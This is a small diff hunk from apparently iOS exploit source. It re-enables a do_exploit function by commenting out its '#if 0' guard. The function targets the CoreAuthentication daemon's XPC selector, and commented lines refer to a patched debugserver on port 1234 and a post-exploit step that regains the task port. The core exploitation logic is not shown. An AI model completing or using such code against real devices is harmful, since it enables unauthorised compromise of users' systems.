@@ -949,7 +949,7 @@ sploit(
 
 
 int do_exploit() {
-#if 0
+//#if 0
   logMsg("Starting TRI POLOSKI (bass boosted).\n");
   char* target_service_name = "com.apple.CoreAuthentication.daemon"; //still think is the fastest one
   char* target_selector = "connectToExistingContext:callback:reply:";
@@ -974,7 +974,7 @@ int do_exploit() {
   //logMsg("patched debugserver listening on port 1234");
   //logMsg("press ps for process listing");
   
-#endif
+//#endif
   //do_post_exploit(mach_task_self()); //If we are already exploited we want ofcourse to gain our task back at next run
   return 0;
 }
